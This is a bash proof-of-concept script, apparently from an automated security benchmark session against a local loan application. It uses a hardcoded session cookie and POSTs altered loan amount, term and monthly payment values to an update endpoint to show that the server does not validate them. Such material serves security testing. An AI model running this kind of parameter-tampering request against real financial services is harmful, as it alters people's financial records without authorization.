#!/bin/bash
# POC: Demonstrates parameter tampering vulnerability on financial data - manipulating loan_amount, loan_term_months, and monthly_payment without server-side validation
# Target: ./repo
# Created: 2025-10-31T14:42:31.229Z
# Session: benchmark-XBEN-022-24-mhey9d7a

echo "=================================================="
echo "POC: Parameter Tampering on Financial Data"
echo "=================================================="
echo ""

TARGET="http://localhost:8080"
# Valid session cookie for user_id 1
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQTKcg.45I1D9AQ-I_4IbpvZvDdMN0S8gY"

echo "[*] Step 1: Fetching original loan data..."
ORIGINAL_DATA=$(curl -s "$TARGET/profile" -H "Cookie: $SESSION_COOKIE")

# Extract original values
ORIGINAL_LOAN=$(echo "$ORIGINAL_DATA" | grep -oP 'name="loan_amount"[^>]*value="\K[^"]+' | head -1)
ORIGINAL_TERM=$(echo "$ORIGINAL_DATA" | grep -oP 'name="loan_term_months"[^>]*value="\K[^"]+' | head -1)
ORIGINAL_PAYMENT=$(echo "$ORIGINAL_DATA" | grep -oP 'name="monthly_payment"[^>]*value="\K[^"]+' | head -1)

echo "[+] Original loan_amount: $ORIGINAL_LOAN"
echo "[+] Original loan_term_months: $ORIGINAL_TERM"
echo "[+] Original monthly_payment: $ORIGINAL_PAYMENT"
echo ""

echo "[*] Step 2: Tampering with financial parameters..."
echo "[!] Attempting to change:"
echo "    - loan_amount: $ORIGINAL_LOAN -> 50000"
echo "    - loan_term_months: $ORIGINAL_TERM -> 120"
echo "    - monthly_payment: $ORIGINAL_PAYMENT -> 500.00"
echo ""

# Attempt parameter tampering
TAMPER_RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET/update_profile" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "name=TestUser" \
  -F "lastname=TestLast" \
  -F "email=test@example.com" \
  -F "loan_amount=50000" \
  -F "loan_term_months=120" \
  -F "monthly_payment=500.00")

HTTP_CODE=$(echo "$TAMPER_RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)

if [ "$HTTP_CODE" != "200" ]; then
    echo "[-] Update failed with HTTP code: $HTTP_CODE"
    exit 1
fi

echo "[+] Update request returned HTTP 200"
echo ""

echo "[*] Step 3: Verifying tampering was successful..."
UPDATED_DATA=$(curl -s "$TARGET/profile" -H "Cookie: $SESSION_COOKIE")

# Extract updated values
UPDATED_LOAN=$(echo "$UPDATED_DATA" | grep -oP 'name="loan_amount"[^>]*value="\K[^"]+' | head -1)
UPDATED_TERM=$(echo "$UPDATED_DATA" | grep -oP 'name="loan_term_months"[^>]*value="\K[^"]+' | head -1)
UPDATED_PAYMENT=$(echo "$UPDATED_DATA" | grep -oP 'name="monthly_payment"[^>]*value="\K[^"]+' | head -1)

echo "[+] Updated loan_amount: $UPDATED_LOAN"
echo "[+] Updated loan_term_months: $UPDATED_TERM"
echo "[+] Updated monthly_payment: $UPDATED_PAYMENT"
echo ""

# Verify tampering was successful
if [ "$UPDATED_LOAN" = "50000.0" ] || [ "$UPDATED_LOAN" = "50000" ]; then
    echo "=================================================="
    echo "[!] VULNERABILITY CONFIRMED!"
    echo "=================================================="
    echo "[!] Successfully tampered with financial data:"
    echo "    - Loan amount changed from $ORIGINAL_LOAN to $UPDATED_LOAN"
    echo "    - Loan term changed from $ORIGINAL_TERM to $UPDATED_TERM months"
    echo "    - Monthly payment changed from $ORIGINAL_PAYMENT to $UPDATED_PAYMENT"
    echo ""
    echo "[!] IMPACT: User can manipulate critical financial obligations"
    echo "    without authorization or server-side validation!"
    echo "=================================================="
    exit 0
else
    echo "[-] Tampering verification failed"
    echo "    Expected loan_amount: 50000, Got: $UPDATED_LOAN"
    exit 1
fi